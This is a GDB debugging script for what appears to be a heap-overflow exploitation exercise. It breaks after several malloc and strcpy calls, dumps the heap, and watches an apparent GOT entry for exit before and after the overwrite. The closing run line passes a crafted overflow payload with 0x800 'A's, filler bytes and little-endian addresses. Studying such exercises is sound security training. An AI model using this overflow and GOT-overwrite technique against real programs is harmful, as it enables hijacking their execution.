set height 0
set width 0
set disassembly-flavor intel

b* main
commands 1 
end

b* main+39
commands 2
    printf "p malloc\n"
    set $p = $eax
    x/32x $p
end

b* main+55
commands 3
    printf "q malloc\n"
    set $q = $eax
    x/32x $q
end

b* main+71
commands 4
    printf "r malloc\n"
    set $r = $eax
    x/32x $r
    printf "exit before\n"
    x/x 0x804c028
end

b* main+111
commands 5
    printf "s malloc\n"
    set $s = $eax
    x/32x $s
    printf "exit after\n"
    x/x 0x804c028
end

b* main+99
commands 6
    printf "r strcpy, bottom\n"
    x/32x $r+0x800
end

b* main+147
commands 7
    printf "s strncpy\n"
    x/32x $s
end

r $(python -c 'print "A"*0x800+"B"*4+"\xe8\xbf\x04\x08"') $(python -c 'print "\x19\xdf\xff\xff"')
